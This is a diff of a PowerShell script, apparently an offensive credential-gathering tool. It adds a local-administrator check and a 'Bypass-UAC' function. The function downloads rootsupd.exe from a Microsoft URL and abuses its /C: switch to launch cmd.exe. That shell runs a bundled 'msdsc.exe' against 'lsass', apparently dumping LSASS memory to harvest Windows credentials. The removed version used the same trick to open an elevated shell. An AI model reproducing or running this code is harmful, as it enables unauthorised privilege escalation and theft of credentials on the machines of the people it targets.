@@ -254,6 +254,18 @@ function Test-InternetConnection {
     }
 }
 
+function Test-IsInLocalAdministratorsGroup {
+    $me = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name    
+    $group = Get-CimInstance -ClassName Win32_Group  -Filter "Name = 'Administrators'"    
+    $administrators = Get-CimAssociatedInstance -InputObject $group -ResultClassName Win32_UserAccount | select -ExpandProperty Caption         
+    if ($administrators -notcontains $me) {
+        $false
+    }
+    else {
+        $true
+    }
+}
+
 function Test-LocalAdminRights {
     $myComputer = Get-WMIObject Win32_ComputerSystem | Select-Object -ExpandProperty name
     $myUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
@@ -298,15 +310,13 @@ function Set-ActiveDirectoryInformations ($adFlag) {
         try {$backupOperators = (Get-ADGroupMember $backupOperatorsGroup -Recursive).DistinguishedName}catch{}      
     }
 }
-function Elevate-YourRightsMan {
+function Bypass-UAC ($scriptPath, $logDirectoryPath) {      
+    Write-Host "Your are not an administrator of this computer.. I'm trying to elevate your privileges"           
     $fileToDownload = "http://download.microsoft.com/download/1/F/F/1FF5FEA9-C0F4-4B66-9373-278142683592/rootsupd.exe" 
-    $fileDownloaded = "C:\Windows\temp\rootsupd.exe" 
+    $fileDownloaded = "$logDirectoryPath\rootsupd.exe" 
      
     $webClient = new-object System.Net.WebClient 
-    $webClient.DownloadFile($fileToDownload, $fileDownloaded) 
-     
-    $scriptPath = Split-Path $MyInvocation.InvocationName        
-   
-    &$fileDownloaded "/C:c:\windows\system32\cmd.exe /K Title (launch the script from here, you are admin now)"
-}
+    $webClient.DownloadFile($fileToDownload, $fileDownloaded)              
 
+    &$fileDownloaded "/C:C:\Windows\System32\cmd.exe /C $scriptPath\msdsc.exe lsass $logDirectoryPath Title (launch the script from here, you are admin now)"    
+}
